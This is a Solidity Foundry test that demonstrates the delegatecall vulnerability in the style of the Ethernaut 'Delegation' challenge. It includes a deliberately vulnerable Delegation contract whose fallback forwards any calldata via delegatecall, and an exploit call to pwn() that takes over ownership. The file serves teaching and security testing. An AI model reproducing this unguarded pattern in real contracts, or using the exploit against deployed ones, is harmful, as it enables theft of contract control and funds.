// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

contract ContractTest is Test {
        Delegation DelegationContract;
        Delegate DelegateContract;

function testDelegatecall() public {

    address alice = vm.addr(1);
    address eve = vm.addr(2);
    vm.deal(address(alice), 1 ether);   
    vm.deal(address(eve), 1 ether); 
    DelegateContract = new Delegate(msg.sender);
    DelegationContract = new Delegation(address(DelegateContract));
    console.log("DelegateContract owner:",DelegateContract.owner());
    console.log("DelegationContract owner:",DelegationContract.owner());
    vm.prank(alice);   
    // Delegatecall allows a smart contract to dynamically load code from a different address at runtime. 
    address(DelegationContract).call(abi.encodeWithSignature("pwn()")); //exploit here

    console.log("DelegationContract owner changed",DelegationContract.owner());
    console.log("Exploit completed");

    }
    receive() payable external{}
}

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
